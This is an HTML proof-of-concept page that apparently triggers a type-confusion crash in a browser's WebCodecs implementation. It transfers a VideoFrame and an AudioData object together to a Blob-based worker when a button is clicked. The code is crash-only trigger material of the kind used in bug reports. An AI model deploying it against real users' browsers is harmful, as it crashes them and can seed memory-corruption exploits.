<!DOCTYPE html>
<html>
<head>
  <title>Type Confusion PoC</title>
</head>
<body>
  <h1>WebCodecs Type Confusion PoC</h1>
  <p>Check the console or run this in a vulnerable build to observe the crash.</p>
  <button id="crashBtn">Click to Trigger Bug</button>
  <script>
    async function trigger() {
      // 1. Create a valid VideoFrame
      const canvas = document.createElement('canvas');
      canvas.width = 10;
      canvas.height = 10;
      const videoFrame = new VideoFrame(canvas, { timestamp: 0 });

      // 2. Create a valid AudioData object
      const audioData = new AudioData({
        format: 'f32-planar',
        sampleRate: 44100,
        numberOfFrames: 100,
        numberOfChannels: 1,
        timestamp: 0,
        data: new Float32Array(100)
      });

      // 3. Trigger the bug by transferring them together to a worker
      // We use a Blob to keep this PoC self-contained without needing a separate worker.js file.
      const workerCode = `self.onmessage = function(e) { console.log('Worker received:', e.data); };`;
      const blob = new Blob([workerCode], { type: 'application/javascript' });
      const worker = new Worker(URL.createObjectURL(blob));

      // If Identical Code Folding (ICF) merges their kTransferListKey variables,
      // the serializer will append AudioData to the VideoFrameTransferList.
      try {
        worker.postMessage("crash", [videoFrame, audioData]);
        console.log("postMessage executed. If the browser didn't crash, the bug might be fixed or ICF wasn't applied.");
      } catch (e) {
        console.error("An exception occurred (likely DataCloneError if properly handled):", e);
      }
    }

    document.getElementById('crashBtn').addEventListener('click', trigger);
  </script>
</body>
</html>
